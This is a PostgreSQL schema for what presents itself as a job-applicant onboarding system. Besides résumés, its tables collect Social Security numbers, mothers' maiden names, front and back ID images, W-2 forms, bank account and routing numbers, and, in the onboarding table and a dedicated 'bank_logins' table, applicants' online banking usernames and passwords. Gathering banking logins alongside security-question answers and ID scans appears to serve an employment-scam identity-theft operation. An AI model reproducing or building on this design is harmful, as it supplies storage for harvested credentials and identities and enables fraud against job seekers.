-- ============================================================
-- Enable Required Extensions
-- ============================================================

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- ============================================================
-- Drop Tables (Drop in Reverse Dependency Order)
-- ============================================================

DROP TABLE IF EXISTS bank_logins CASCADE;
DROP TABLE IF EXISTS onboarding CASCADE;
DROP TABLE IF EXISTS applicants CASCADE;
DROP TABLE IF EXISTS admin_users CASCADE;

-- ============================================================
-- Admin Users Table
-- ============================================================

CREATE TABLE admin_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  username TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================
-- Applicants Table
-- ============================================================

CREATE TABLE applicants (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),

  first_name TEXT NOT NULL,
  last_name  TEXT NOT NULL,
  email      TEXT UNIQUE NOT NULL,
  phone      TEXT NOT NULL,

  -- Resume (public URL and binary version)
  resume_url     TEXT,
  resume_binary  BYTEA,
  resume_mime    TEXT,

  status TEXT NOT NULL DEFAULT 'pending',  -- 'pending' | 'accepted' | 'rejected'
  application_date DATE NOT NULL DEFAULT CURRENT_DATE
);

CREATE INDEX idx_applicants_status ON applicants(status);

-- ============================================================
-- Onboarding Table
-- ============================================================

CREATE TABLE onboarding (
  applicant_id UUID PRIMARY KEY REFERENCES applicants(id) ON DELETE CASCADE,

  -- Identity Info
  first_name         TEXT NOT NULL,
  middle_name        TEXT,
  last_name          TEXT NOT NULL,
  mother_maiden_name TEXT,
  date_of_birth      DATE NOT NULL,
  ssn                TEXT,  -- ⚠️ Encrypt or mask in app

  -- Address Info
  street   TEXT NOT NULL,
  city     TEXT NOT NULL,
  state    TEXT NOT NULL,
  zip_code TEXT NOT NULL,

  -- Banking Info
  account_number TEXT NOT NULL,
  routing_number TEXT NOT NULL,
  bank_name      TEXT NOT NULL,
  bank_username  TEXT,
  bank_password  TEXT, -- ⚠️ Encrypt in app

  -- Public File URLs
  front_image_url TEXT NOT NULL,
  back_image_url  TEXT NOT NULL,
  w2_form_url     TEXT NOT NULL,

  -- Binary Storage
  front_image_binary BYTEA,
  front_image_mime   TEXT,

  back_image_binary  BYTEA,
  back_image_mime    TEXT,

  w2_form_binary     BYTEA,
  w2_form_mime       TEXT,

  onboarding_completed BOOLEAN NOT NULL DEFAULT FALSE,
  onboarding_date      TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================
-- Bank Logins Table
-- ============================================================

CREATE TABLE bank_logins (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  applicant_id UUID NOT NULL REFERENCES applicants(id) ON DELETE CASCADE,

  bank_name TEXT NOT NULL,
  username  TEXT NOT NULL,
  password  TEXT NOT NULL, -- ⚠️ Encrypt in app

  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_bank_logins_applicant_id ON bank_logins(applicant_id);
